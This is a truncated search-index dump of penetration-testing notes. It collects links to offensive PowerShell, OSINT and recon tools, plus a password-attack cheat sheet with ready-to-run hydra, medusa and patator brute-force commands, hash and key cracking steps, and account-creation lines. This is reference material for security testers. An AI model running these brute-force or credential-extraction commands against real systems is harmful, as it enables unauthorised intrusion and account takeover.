https://github.com/G4lB1t/Invoke-NoShell","title":"Modules"},{"location":"os/windows/powershell/modules/#modules","text":"","title":"Modules"},{"location":"os/windows/powershell/modules/#port-scaning","text":"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1","title":"Port Scaning"},{"location":"os/windows/powershell/modules/#brute-forcing","text":"https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1 https://github.com/NetSPI/PowerShell/blob/master/Invoke-ExternalDomainBruteforce.ps1","title":"Brute Forcing"},{"location":"os/windows/powershell/modules/#database-attacks","text":"PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL","title":"Database Attacks"},{"location":"os/windows/powershell/modules/#encoding-payloads","text":"https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1","title":"Encoding Payloads"},{"location":"os/windows/powershell/modules/#capture-ntlm","text":"https://github.com/Kevin-Robertson/Inveigh","title":"Capture NTLM"},{"location":"os/windows/powershell/modules/#obfuscation","text":"https://github.com/danielbohannon/Invoke-Obfuscation https://github.com/danielbohannon/Invoke-DOSfuscation","title":"Obfuscation"},{"location":"os/windows/powershell/modules/#fileless-malware","text":"Invoke-NoShell outputs a Microsoft Office Word .doc file with an embedded macro: https://github.com/G4lB1t/Invoke-NoShell","title":"Fileless Malware"},{"location":"os/windows/powershell/z-Resources/","text":"Resources New References PowerShell Basics for Security Professionals Part 1: https://www.youtube.com/watch?v=B0EsL1j_-qw Development Environment How To Make Visual Studio Code Look And Behave Like The PowerShell ISE: https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/","title":"Resources"},{"location":"os/windows/powershell/z-Resources/#resources","text":"","title":"Resources"},{"location":"os/windows/powershell/z-Resources/#new-references","text":"PowerShell Basics for Security Professionals Part 1: https://www.youtube.com/watch?v=B0EsL1j_-qw","title":"New References"},{"location":"os/windows/powershell/z-Resources/#development-environment","text":"How To Make Visual Studio Code Look And Behave Like The PowerShell ISE: https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/","title":"Development Environment"},{"location":"osint/y-Tools/","text":"Tools Craal (GitHub, Pastebin, S3 Buckets, Protoxin, CertStream): https://github.com/jaylagorio/craal Semi-automatic OSINT framework and package manager: https://github.com/kpcyrd/sn0int Discover and extract hostnames providing a large set of target IP addresses: -https://github.com/SpiderLabs/HostHunter sslyze - Fast and powerful SSL/TLS server scanning library. Email TheHarvester theharvester -\u00ad\u2010d cisco.com -\u00ad\u2010b google theharvester -\u00ad\u2010d cisco.com -\u00ad\u2010b bing Domain Related Tools Dmain Registrations https://domainbigdata.com https://viewdns.info/ https://pulsedive.com/ https://www.apnic.net/static/whowas-ui/ Archive https://archive.org/ Similar websites https://similarsites.com/ Subdomains Finds subdomains in google, bing, etc: python theHarvester.py -l 500 -b all -d $ip Generates permutations, alterations and mutations of subdomains and then resolves them: https://github.com/infosec-au/altdns https://github.com/aboul3la/Sublist3r Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS. SubFinder is a subdomain discovery tool that discovers valid subdomains for websites: https://github.com/subfinder/subfinder Knockpy is a python tool designed to enumerate subdomains on a target domain through a wordlist: https://github.com/guelfoweb/knock https://findsubdomains.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain Abusing Certificate Transparency logs for getting HTTPS websites subdomains: https://github.com/UnaPibaGeek/ctfr https://github.com/subfinder/subfinder Source Code Analysis https://publicwww.com/ https://nerdydata.com/ Analytic ID cross referencing http://analyzeid.com/ SSL Certificates https://certdb.com/ https://crt.sh/ Whois API https://www.whoisxmlapi.com/ https://www.whoxy.com/ OSINT tool for visualizing relationships between domains, IPs and email addresses: https://hackernoon.com/osint-tool-for-visualizing-relationships-between-domains-ips-and-email-addresses-94377aa1f20a Subdomain to IP Bouncing through an old expired domain. Trusted in all lists. W/ a single target domain url, enumerate subdomains. Subdomains IP Addresses ARIN crawl for more CIDRs. https://twitter.com/TinkerSec/status/1097912618663243783 OSINT-SPY Performs OSINT scan on email/domain/ip_address/organization. https://www.kitploit.com/2019/02/osint-spy-search-using-osint-open.html https://github.com/SharadKumar97/OSINT-SPY Services https://www.shodan.io Find compromised NoSQL systems from Shodan JSON export: https://gist.github.com/n0x08/39c4fef373d0ac02d61da5d1d3865ce5 https://censys.io/ https://www.zoomeye.org/ https://www.binaryedge.io/ https://viz.greynoise.io/table https://fofa.so/ https://www.onyphe.io/ https://hunter.io/ https://wigle.net/ https://ghostproject.fr/ https://www.onyphe.io/ https://inteltechniques.com/blog/2018/09/30/breach-data-search-engines-comparison/ OS (VM) Buscador Investigative Operating System: https://inteltechniques.com/buscador/ AQUATONE visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface. GitHub: https://github.com/michenriksen/aquatone Social LikedIn: https://github.com/vysecurity/LinkedInt ReconNG General commands: show modules keys list workspace add show schema show domains show hosts add companies add domains search reporting show dashboard Import emails from harvester, etc.: set TABLE contacts set COLUMN email set FILENAME united_emails.txt run Search Showdan for host names: use recon/domains-hosts/shodan_hostname run show hosts show ports Reporting: use report/list show options set FILNAME /location/on/file/system run use reporting/html show options set CREATOR Pentester set COMPANY United Airlines Summarized References https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ http://securenetworkmanagement.com/recon-ng-tutorial-part-1/ http://securenetworkmanagement.com/recon-ng-tutorial-part-2/ http://securenetworkmanagement.com/recon-ng-tutorial-part-3/ Vanquish Vanquish is Kali Linux based Enumeration Orchestrator. | NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident-user-enum | Smtp-user-enum | Snmp-check | Cisco-torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan-unixwiz | Xprobe2 | Blindelephant | Showmount | LazyRecon An automated approach to performing recon for bug bounty hunting and penetration testing. Subdomain Enumeration: Amass Subfinder Subdomain Takeover: subjack CORS Configuration: CORScanner IP Discovery: Massdns Port Scanning: Masscan Nmap Nmap Bootstrap Stylesheet Visual Recon: Aquatone Content Discovery: Dirsearch Wordlists: JHaddix's all.txt SecLists' raft-large-words.txt GitHub: https://github.com/capt-meelo/LazyRecon/ chomp-scan Streamline the bug bounty/penetration test reconnaissance phase Subdomain Discovery (3 different sized wordlists) dnscan subfinder sublist3r massdns + altdns subjack Screenshots (optional) aquatone Port Scanning (optional) masscan and/or nmap Content Discovery (optional) (4 different sized wordlists) ffuf bfac nikto whatweb Wordlists Subdomain Bruteforcing subdomains-top1mil-20000.txt - 22k words - From Seclists sortedcombined-knock-dnsrecon-fierce-reconng.txt - 102k words - From Seclists huge-200k - 199k words - A combination I made of various wordlists, including Seclists Content Discovery big.txt - 20k words - From Seclists raft-large-combined.txt - 167k words - A combination of the raft wordlists in Seclists seclists-combined.txt - 215k words - A larger combination of all the Discovery/DNS lists in Seclists haddix_content_discovery_all.txt - 373k words - Jason Haddix's all content discovery list haddix-seclists-combined.txt - 486k words - A combination of the two previous lists Misc. altdns-words.txt - 240 words - Used for creating domain permutations for masscan to resolve. Borrowed from altdns . interesting.txt - 42 words - A list I created of potentially interesting words appearing in domain names. GitHub: https://github.com/SolomonSklash/chomp-scan pown-recon A powerful target reconnaissance framework powered by graph theory. GitHub: https://github.com/pownjs/pown-recon Other EyeWitness - take screenshots of websites, provide some server header info, and identify default credentials if possible: https://github.com/FortyNorthSecurity/EyeWitness References New References Exploiting Vulnerabilities Through Proper Reconnaissance: https://docs.google.com/presentation/d/1xgvEScGZ_ukNY0rmfKz1JN0sn-CgZY_rTp2B_SZvijk/edit#slide=id.g4052c4692d_0_0 Recon My Way: https://github.com/ehsahil/recon-my-way","title":"Tools"},{"location":"osint/y-Tools/#tools","text":"Craal (GitHub, Pastebin, S3 Buckets, Protoxin, CertStream): https://github.com/jaylagorio/craal Semi-automatic OSINT framework and package manager: https://github.com/kpcyrd/sn0int Discover and extract hostnames providing a large set of target IP addresses: -https://github.com/SpiderLabs/HostHunter sslyze - Fast and powerful SSL/TLS server scanning library.","title":"Tools"},{"location":"osint/y-Tools/#email","text":"","title":"Email"},{"location":"osint/y-Tools/#theharvester","text":"theharvester -\u00ad\u2010d cisco.com -\u00ad\u2010b google theharvester -\u00ad\u2010d cisco.com -\u00ad\u2010b bing","title":"TheHarvester"},{"location":"osint/y-Tools/#domain-related-tools","text":"Dmain Registrations https://domainbigdata.com https://viewdns.info/ https://pulsedive.com/ https://www.apnic.net/static/whowas-ui/ Archive https://archive.org/ Similar websites https://similarsites.com/ Subdomains Finds subdomains in google, bing, etc: python theHarvester.py -l 500 -b all -d $ip Generates permutations, alterations and mutations of subdomains and then resolves them: https://github.com/infosec-au/altdns https://github.com/aboul3la/Sublist3r Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS. SubFinder is a subdomain discovery tool that discovers valid subdomains for websites: https://github.com/subfinder/subfinder Knockpy is a python tool designed to enumerate subdomains on a target domain through a wordlist: https://github.com/guelfoweb/knock https://findsubdomains.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain Abusing Certificate Transparency logs for getting HTTPS websites subdomains: https://github.com/UnaPibaGeek/ctfr https://github.com/subfinder/subfinder Source Code Analysis https://publicwww.com/ https://nerdydata.com/ Analytic ID cross referencing http://analyzeid.com/ SSL Certificates https://certdb.com/ https://crt.sh/ Whois API https://www.whoisxmlapi.com/ https://www.whoxy.com/ OSINT tool for visualizing relationships between domains, IPs and email addresses: https://hackernoon.com/osint-tool-for-visualizing-relationships-between-domains-ips-and-email-addresses-94377aa1f20a","title":"Domain Related Tools"},{"location":"osint/y-Tools/#subdomain-to-ip","text":"Bouncing through an old expired domain. Trusted in all lists. W/ a single target domain url, enumerate subdomains. Subdomains IP Addresses ARIN crawl for more CIDRs. https://twitter.com/TinkerSec/status/1097912618663243783","title":"Subdomain to IP"},{"location":"osint/y-Tools/#osint-spy","text":"Performs OSINT scan on email/domain/ip_address/organization. https://www.kitploit.com/2019/02/osint-spy-search-using-osint-open.html https://github.com/SharadKumar97/OSINT-SPY","title":"OSINT-SPY"},{"location":"osint/y-Tools/#services","text":"https://www.shodan.io Find compromised NoSQL systems from Shodan JSON export: https://gist.github.com/n0x08/39c4fef373d0ac02d61da5d1d3865ce5 https://censys.io/ https://www.zoomeye.org/ https://www.binaryedge.io/ https://viz.greynoise.io/table https://fofa.so/ https://www.onyphe.io/ https://hunter.io/ https://wigle.net/ https://ghostproject.fr/ https://www.onyphe.io/ https://inteltechniques.com/blog/2018/09/30/breach-data-search-engines-comparison/","title":"Services"},{"location":"osint/y-Tools/#os-vm","text":"Buscador Investigative Operating System: https://inteltechniques.com/buscador/","title":"OS (VM)"},{"location":"osint/y-Tools/#aquatone","text":"visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface. GitHub: https://github.com/michenriksen/aquatone","title":"AQUATONE"},{"location":"osint/y-Tools/#social","text":"LikedIn: https://github.com/vysecurity/LinkedInt","title":"Social"},{"location":"osint/y-Tools/#reconng","text":"General commands: show modules keys list workspace add show schema show domains show hosts add companies add domains search reporting show dashboard Import emails from harvester, etc.: set TABLE contacts set COLUMN email set FILENAME united_emails.txt run Search Showdan for host names: use recon/domains-hosts/shodan_hostname run show hosts show ports Reporting: use report/list show options set FILNAME /location/on/file/system run use reporting/html show options set CREATOR Pentester set COMPANY United Airlines","title":"ReconNG"},{"location":"osint/y-Tools/#summarized-references","text":"https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ http://securenetworkmanagement.com/recon-ng-tutorial-part-1/ http://securenetworkmanagement.com/recon-ng-tutorial-part-2/ http://securenetworkmanagement.com/recon-ng-tutorial-part-3/","title":"Summarized References"},{"location":"osint/y-Tools/#vanquish","text":"Vanquish is Kali Linux based Enumeration Orchestrator. | NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident-user-enum | Smtp-user-enum | Snmp-check | Cisco-torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan-unixwiz | Xprobe2 | Blindelephant | Showmount |","title":"Vanquish"},{"location":"osint/y-Tools/#lazyrecon","text":"An automated approach to performing recon for bug bounty hunting and penetration testing. Subdomain Enumeration: Amass Subfinder Subdomain Takeover: subjack CORS Configuration: CORScanner IP Discovery: Massdns Port Scanning: Masscan Nmap Nmap Bootstrap Stylesheet Visual Recon: Aquatone Content Discovery: Dirsearch Wordlists: JHaddix's all.txt SecLists' raft-large-words.txt GitHub: https://github.com/capt-meelo/LazyRecon/","title":"LazyRecon"},{"location":"osint/y-Tools/#chomp-scan","text":"Streamline the bug bounty/penetration test reconnaissance phase Subdomain Discovery (3 different sized wordlists) dnscan subfinder sublist3r massdns + altdns subjack Screenshots (optional) aquatone Port Scanning (optional) masscan and/or nmap Content Discovery (optional) (4 different sized wordlists) ffuf bfac nikto whatweb Wordlists Subdomain Bruteforcing subdomains-top1mil-20000.txt - 22k words - From Seclists sortedcombined-knock-dnsrecon-fierce-reconng.txt - 102k words - From Seclists huge-200k - 199k words - A combination I made of various wordlists, including Seclists Content Discovery big.txt - 20k words - From Seclists raft-large-combined.txt - 167k words - A combination of the raft wordlists in Seclists seclists-combined.txt - 215k words - A larger combination of all the Discovery/DNS lists in Seclists haddix_content_discovery_all.txt - 373k words - Jason Haddix's all content discovery list haddix-seclists-combined.txt - 486k words - A combination of the two previous lists Misc. altdns-words.txt - 240 words - Used for creating domain permutations for masscan to resolve. Borrowed from altdns . interesting.txt - 42 words - A list I created of potentially interesting words appearing in domain names. GitHub: https://github.com/SolomonSklash/chomp-scan","title":"chomp-scan"},{"location":"osint/y-Tools/#pown-recon","text":"A powerful target reconnaissance framework powered by graph theory. GitHub: https://github.com/pownjs/pown-recon","title":"pown-recon"},{"location":"osint/y-Tools/#other","text":"EyeWitness - take screenshots of websites, provide some server header info, and identify default credentials if possible: https://github.com/FortyNorthSecurity/EyeWitness","title":"Other"},{"location":"osint/y-Tools/#references","text":"","title":"References"},{"location":"osint/y-Tools/#new-references","text":"Exploiting Vulnerabilities Through Proper Reconnaissance: https://docs.google.com/presentation/d/1xgvEScGZ_ukNY0rmfKz1JN0sn-CgZY_rTp2B_SZvijk/edit#slide=id.g4052c4692d_0_0 Recon My Way: https://github.com/ehsahil/recon-my-way","title":"New References"},{"location":"osint/z-References/","text":"References List of s3 leaks: https://github.com/nagwww/s3-leaks OSINT Framework: https://osintframework.com/ RiskIQ Community Edition: digital threat hunters and defenders free access to our comprehensive internet data to hunt digital threats: https://www.riskiq.com/products/community-edition/ Deleted content: https://osintcurio.us/2019/02/12/osint-on-deleted-content/ Week in OSINT #2019\u201306: https://medium.com/week-in-osint/week-in-osint-2019-06-8a13feb018a8 SANS Webcast: OSINT for Pentesters Finding Targets and Enumerating Systems: https://www.youtube.com/watch?v=eHOMGUTi9yo feature=youtu.be","title":"References"},{"location":"osint/z-References/#references","text":"List of s3 leaks: https://github.com/nagwww/s3-leaks OSINT Framework: https://osintframework.com/ RiskIQ Community Edition: digital threat hunters and defenders free access to our comprehensive internet data to hunt digital threats: https://www.riskiq.com/products/community-edition/ Deleted content: https://osintcurio.us/2019/02/12/osint-on-deleted-content/ Week in OSINT #2019\u201306: https://medium.com/week-in-osint/week-in-osint-2019-06-8a13feb018a8 SANS Webcast: OSINT for Pentesters Finding Targets and Enumerating Systems: https://www.youtube.com/watch?v=eHOMGUTi9yo feature=youtu.be","title":"References"},{"location":"password-attacks/0-cheetsheet/","text":"Cheetsheet Finding Passwords grep -rl hash grep -rl password Wordlist creation crunch 6 6 0123456789ABCDEF -o list.txt crunch 8 8 -t ,@@^^%%% /usr/share/crunch/charset.lsr mixalpha -o mixda.txt Wordlist using keywords from a site cewl example.com -m 6 -w out.txt Mutate wordlists /etc/john/john.conf $[0-9]$[0-9] john --wordlist=out.txt --rules --stdout mutated.txt Tools pwdump fgdump windows credential editor (WCE) - Steal NTLM hashes from memory and auth modules Password Cracking john hashes.txt Htaccess medusa -h ip -u admin -P passwords.txt -M http -m DIR:/admin -T 20 FTP hydra -l admin -P pass.txt -v ip ftp HTTP Post hydra -l none -P rockyou.txt 10.10.10.43 http-post-form /department/login.php:username=admin password=^PASS^:Invalid Password -t 64 -V SSH hydra -L usernames.txt -P passwords.txt -s 2222 ssh://10.10.10.66 -v -t 4 Basic Auth cewl example.com -m 6 -w /root/mega-cewl.txt 2 /dev/null john --wordlist=mega-cewl.txt --rules --studout mega-cewl-mutated.txt medusa -h admin.example.com -u admin -P mega-cewl-mutated.txt -M http -n 81 -m DIR:/admin -T 30 Salted Hash Cracking oclHashcat oclHashcat input file should be in format: passwordhash:salt oclHashcat-plus64.bin -m 110 hashes.txt ../big-wordlist --force RSA Private Key Password Recovery ssh2john id_rsa id_john john id_john --wordlist= PATH TO ROCKYOU.TXT KeePass Password Recovery keepass2john jeeves.kdbx jeeves.hash john jeeves.hash /etc/passwrd format Understanding /etc/passwd File Format Linux Password Shadow File Formats Password Field Format: $id$salt$hashed ( $id$$hashed means no salt) * account cannot be used to log in !! user doesn't have a password user doesn't have a password x password is stored in the shadow file id $1$ is MD5 $2a$ is Blowfish $2y$ is Blowfish $5$ is SHA-256 $6$ is SHA-512 Verify pwck -r /etc/passwd pwck -r /etc/shadow Edit vipw -p vipw -s vipw -g Manually create password openssl passwd -1 -salt xyz yourpass makepasswd --clearfrom=- --crypt-md5 YourPass mkpasswd -m sha-512 -s YourPass echo -e md5crypt\\npassword | grub | grep -o \\$1.* perl -e 'use Crypt::PasswdMD5; print unix_md5_crypt( Password , Salt ), \\n ' Update password echo username:password | chpasswd perl -e 'print crypt( YourPasswd , salt ), \\n ' echo username:encryptedPassWd | chpasswd -e OR useradd -p 'encryptedPassWd' username","title":"Cheetsheet"},{"location":"password-attacks/0-cheetsheet/#cheetsheet","text":"","title":"Cheetsheet"},{"location":"password-attacks/0-cheetsheet/#finding-passwords","text":"grep -rl hash grep -rl password","title":"Finding Passwords"},{"location":"password-attacks/0-cheetsheet/#wordlist-creation","text":"crunch 6 6 0123456789ABCDEF -o list.txt crunch 8 8 -t ,@@^^%%% /usr/share/crunch/charset.lsr mixalpha -o mixda.txt","title":"Wordlist creation"},{"location":"password-attacks/0-cheetsheet/#wordlist-using-keywords-from-a-site","text":"cewl example.com -m 6 -w out.txt","title":"Wordlist using keywords from a site"},{"location":"password-attacks/0-cheetsheet/#mutate-wordlists","text":"/etc/john/john.conf $[0-9]$[0-9] john --wordlist=out.txt --rules --stdout mutated.txt","title":"Mutate wordlists"},{"location":"password-attacks/0-cheetsheet/#tools","text":"pwdump fgdump windows credential editor (WCE) - Steal NTLM hashes from memory and auth modules","title":"Tools"},{"location":"password-attacks/0-cheetsheet/#password-cracking","text":"john hashes.txt","title":"Password Cracking"},{"location":"password-attacks/0-cheetsheet/#htaccess","text":"medusa -h ip -u admin -P passwords.txt -M http -m DIR:/admin -T 20","title":"Htaccess"},{"location":"password-attacks/0-cheetsheet/#ftp","text":"hydra -l admin -P pass.txt -v ip ftp","title":"FTP"},{"location":"password-attacks/0-cheetsheet/#http-post","text":"hydra -l none -P rockyou.txt 10.10.10.43 http-post-form /department/login.php:username=admin password=^PASS^:Invalid Password -t 64 -V","title":"HTTP Post"},{"location":"password-attacks/0-cheetsheet/#ssh","text":"hydra -L usernames.txt -P passwords.txt -s 2222 ssh://10.10.10.66 -v -t 4","title":"SSH"},{"location":"password-attacks/0-cheetsheet/#basic-auth","text":"cewl example.com -m 6 -w /root/mega-cewl.txt 2 /dev/null john --wordlist=mega-cewl.txt --rules --studout mega-cewl-mutated.txt medusa -h admin.example.com -u admin -P mega-cewl-mutated.txt -M http -n 81 -m DIR:/admin -T 30","title":"Basic Auth"},{"location":"password-attacks/0-cheetsheet/#salted-hash-cracking","text":"","title":"Salted Hash Cracking"},{"location":"password-attacks/0-cheetsheet/#oclhashcat","text":"oclHashcat input file should be in format: passwordhash:salt oclHashcat-plus64.bin -m 110 hashes.txt ../big-wordlist --force","title":"oclHashcat"},{"location":"password-attacks/0-cheetsheet/#rsa-private-key-password-recovery","text":"ssh2john id_rsa id_john john id_john --wordlist= PATH TO ROCKYOU.TXT","title":"RSA Private Key Password Recovery"},{"location":"password-attacks/0-cheetsheet/#keepass-password-recovery","text":"keepass2john jeeves.kdbx jeeves.hash john jeeves.hash","title":"KeePass Password Recovery"},{"location":"password-attacks/0-cheetsheet/#etcpasswrd-format","text":"Understanding /etc/passwd File Format Linux Password Shadow File Formats Password Field Format: $id$salt$hashed ( $id$$hashed means no salt) * account cannot be used to log in !! user doesn't have a password user doesn't have a password x password is stored in the shadow file id $1$ is MD5 $2a$ is Blowfish $2y$ is Blowfish $5$ is SHA-256 $6$ is SHA-512 Verify pwck -r /etc/passwd pwck -r /etc/shadow Edit vipw -p vipw -s vipw -g Manually create password openssl passwd -1 -salt xyz yourpass makepasswd --clearfrom=- --crypt-md5 YourPass mkpasswd -m sha-512 -s YourPass echo -e md5crypt\\npassword | grub | grep -o \\$1.* perl -e 'use Crypt::PasswdMD5; print unix_md5_crypt( Password , Salt ), \\n ' Update password echo username:password | chpasswd perl -e 'print crypt( YourPasswd , salt ), \\n ' echo username:encryptedPassWd | chpasswd -e OR useradd -p 'encryptedPassWd' username","title":"/etc/passwrd format"},{"location":"password-attacks/y-Tools/","text":"Tools Word-lists CeWL - Custom Word List Generator: https://github.com/digininja/CeWL Password Spraying Spray: https://github.com/SpiderLabs/Spray Password spraying using AWS Lambda for IP rotation: https://github.com/ustayready/CredKing Brute-forcing Patator - multi-purpose brute-forcer: https://github.com/lanjelot/patator * ftp_login : Brute-force FTP * ssh_login : Brute-force SSH * telnet_login : Brute-force Telnet * smtp_login : Brute-force SMTP * smtp_vrfy : Enumerate valid users using the SMTP VRFY command * smtp_rcpt : Enumerate valid users using the SMTP RCPT TO command * finger_lookup : Enumerate valid users using Finger * http_fuzz : Brute-force HTTP/HTTPS * rdp_gateway : Brute-force RDP Gateway * ajp_fuzz : Brute-force AJP * pop_login : Brute-force POP * pop_passd : Brute-force poppassd (not POP3) * imap_login : Brute-force IMAP * ldap_login : Brute-force LDAP * smb_login : Brute-force SMB * smb_lookupsid : Brute-force SMB SID-lookup * rlogin_login : Brute-force rlogin * vmauthd_login : Brute-force VMware Authentication Daemon * mssql_login : Brute-force MSSQL * oracle_login : Brute-force Oracle * mysql_login : Brute-force MySQL * mysql_query : Brute-force MySQL queries * rdp_login : Brute-force RDP (NLA) * pgsql_login : Brute-force PostgreSQL * vnc_login : Brute-force VNC * dns_forward : Brute-force DNS * dns_reverse : Brute-force DNS (reverse lookup subnets) * ike_enum : Enumerate IKE transforms * snmp_login : Brute-force SNMPv1/2 and SNMPv3 * unzip_pass : Brute-force the password of encrypted ZIP files * keystore_pass : Brute-force the password of Java keystore files * sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases * umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes patator http_fuzz url=http://example.com/index.php method=POST body=\u200b 'name=zapper password=FILE0 autologin=1 enter=Sign+in' 0=/usr/share/SecLists/Passwords/darkweb2017-top1000.txt accept_cookie=1 follow=1 -x ignore:fgrep=\u200b 'Login name or password is incorrect.' Hydra - https://github.com/vanhauser-thc/thc-hydra Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP Medusa - https://github.com/jmk-foofus/medusa AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form ncrack - https://github.com/nmap/ncrack SSH, RDP, FTP, Telnet, HTTP(S), Wordpress, POP3(S), IMAP, CVS, SMB, VNC, SIP, Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA, DICOM. [zip] fcrackzip - https://github.com/hyc/fcrackzip fcrackzip -D -p wordlist.txt -u test.zip Generators Common password pattern generator using strings list: https://github.com/localh0t/m4ngl3m3 A script for generating custom passphrase lists to be used for password cracking with hashcat rules: https://github.com/dafthack/PassphraseGen Extraction Firefox Decrypt - Tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles: https://github.com/unode/firefox_decrypt","title":"Tools"},{"location":"password-attacks/y-Tools/#tools","text":"","title":"Tools"},{"location":"password-attacks/y-Tools/#word-lists","text":"CeWL - Custom Word List Generator: https://github.com/digininja/CeWL","title":"Word-lists"},{"location":"password-attacks/y-Tools/#password-spraying","text":"Spray: https://github.com/SpiderLabs/Spray Password spraying using AWS Lambda for IP rotation: https://github.com/ustayready/CredKing","title":"Password Spraying"},{"location":"password-attacks/y-Tools/#brute-forcing","text":"Patator - multi-purpose brute-forcer: https://github.com/lanjelot/patator * ftp_login : Brute-force FTP * ssh_login : Brute-force SSH * telnet_login : Brute-force Telnet * smtp_login : Brute-force SMTP * smtp_vrfy : Enumerate valid users using the SMTP VRFY command * smtp_rcpt : Enumerate valid users using the SMTP RCPT TO command * finger_lookup : Enumerate valid users using Finger * http_fuzz : Brute-force HTTP/HTTPS * rdp_gateway : Brute-force RDP Gateway * ajp_fuzz : Brute-force AJP * pop_login : Brute-force POP * pop_passd : Brute-force poppassd (not POP3) * imap_login : Brute-force IMAP * ldap_login : Brute-force LDAP * smb_login : Brute-force SMB * smb_lookupsid : Brute-force SMB SID-lookup * rlogin_login : Brute-force rlogin * vmauthd_login : Brute-force VMware Authentication Daemon * mssql_login : Brute-force MSSQL * oracle_login : Brute-force Oracle * mysql_login : Brute-force MySQL * mysql_query : Brute-force MySQL queries * rdp_login : Brute-force RDP (NLA) * pgsql_login : Brute-force PostgreSQL * vnc_login : Brute-force VNC * dns_forward : Brute-force DNS * dns_reverse : Brute-force DNS (reverse lookup subnets) * ike_enum : Enumerate IKE transforms * snmp_login : Brute-force SNMPv1/2 and SNMPv3 * unzip_pass : Brute-force the password of encrypted ZIP files * keystore_pass : Brute-force the password of Java keystore files * sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases * umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes patator http_fuzz url=http://example.com/index.php method=POST body=\u200b 'name=zapper password=FILE0 autologin=1 enter=Sign+in' 0=/usr/share/SecLists/Passwords/darkweb2017-top1000.txt accept_cookie=1 follow=1 -x ignore:fgrep=\u200b 'Login name or password is incorrect.' Hydra - https://github.com/vanhauser-thc/thc-hydra Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP Medusa - https://github.com/jmk-foofus/medusa AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form ncrack - https://github.com/nmap/ncrack SSH, RDP, FTP, Telnet, HTTP(S), Wordpress, POP3(S), IMAP, CVS, SMB, VNC, SIP, Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA, DICOM. [zip] fcrackzip - https://github.com/hyc/fcrackzip fcrackzip -D -p wordlist.txt -u test.zip","title":"Brute-forcing"},{"location":"password-attacks/y-Tools/#generators","text":"Common password pattern generator using strings list: https://github.com/localh0t/m4ngl3m3 A script for generating custom passphrase lists to be used 